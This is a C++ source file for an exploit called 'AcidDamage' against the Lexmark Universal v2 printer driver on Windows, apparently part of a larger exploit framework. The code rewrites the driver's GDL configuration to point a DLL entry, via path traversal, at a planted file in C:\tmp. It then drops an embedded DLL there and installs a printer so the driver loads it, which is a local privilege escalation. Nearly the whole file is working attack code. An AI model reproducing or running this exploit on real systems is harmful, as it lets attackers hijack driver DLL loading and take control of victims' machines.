#include <stdio.h>
#include <stdlib.h>
#include <conio.h>
#include <windows.h>
#include <iostream>
#include <fstream>
#include <thread>
#include <filesystem>

#include "inject_me.hpp"
#include "aciddamage.hpp"

namespace
{
    bool read_all(const std::string& p_path, std::string& p_content)
    {
        std::cout << "[+] Read in " << p_path << std::endl;

        std::ifstream gpl_file;
        gpl_file.open(p_path, std::ifstream::in);
        while (!gpl_file.is_open())
        {
            std::cout << "[-] Failed to open " << p_path << std::endl;
            return false;
        }

        while (gpl_file.good())
        {
            p_content.push_back(gpl_file.get());
        }

        gpl_file.close();
        return true;
    }

    bool overwrite_path(const std::string p_target, std::string& p_contents, const std::string& p_malicious_dll)
    {
        std::cout << "[+] Searching file contents " << std::endl;
        std::string target("<GDL_ATTRIBUTE Name=\"*Name\" xsi:type=\"GDLW_string\">LMUD1OUE.DLL</GDL_ATTRIBUTE>");
        std::size_t pos = p_contents.find(target);
        if (pos == std::string::npos)
        {
            std::cout << "[-] Failed to find vulnerable string" << std::endl;
            return false;
        }

        std::cout << "[+] Updating file contents" << std::endl;
        p_contents.replace(pos, target.size(), "<GDL_ATTRIBUTE Name=\"*Name\" xsi:type=\"GDLW_string\">..\\..\\..\\..\\..\\..\\tmp\\" + p_malicious_dll + "</GDL_ATTRIBUTE>");

        std::cout << "[+] Dropping updated gpl" << std::endl;
        std::ofstream ofs(p_target, std::ofstream::trunc);
        if (!ofs.is_open())
        {
            std::cerr << "[!] Failed to open " << p_target << " for writing" << std::endl;
            return false;
        }
        ofs << p_contents;
        ofs.flush();
        ofs.close();
        return true;
    }
}

AcidDamage::AcidDamage() :
    Exploit("Lexmark Universal v2", "AcidDamage"),
    m_target_directory("C:\\ProgramData\\Lexmark Universal v2\\"),
    m_target_dll("Universal Color Laser.gdl"),
    m_malicious_dll("Dll.dll")
{
}

AcidDamage::~AcidDamage()
{
}

bool AcidDamage::do_exploit()
{
    if (!initialize_attack_space(m_target_directory))
    {
        return false;
    }

    std::string fcontents;
    if (!read_all(m_target_directory + m_target_dll, fcontents))
    {
        return false;
    }

    if (!overwrite_path(m_target_directory + m_target_dll, fcontents, m_malicious_dll))
    {
        return false;
    }

    std::string tmp_dir("C:\\tmp\\");
    std::filesystem::create_directory(tmp_dir);
    drop_dll_to_disk(tmp_dir + m_malicious_dll, inject_me_dll, inject_me_dll_len);

    install_printer();

    if (!std::filesystem::exists("C:\\result.txt"))
    {
        std::cout << "[-] Failed! Oh no!" << std::endl;
    }
    else
    {
        std::cout << "[!] Mucho success!" << std::endl;
    }

    return true;
}
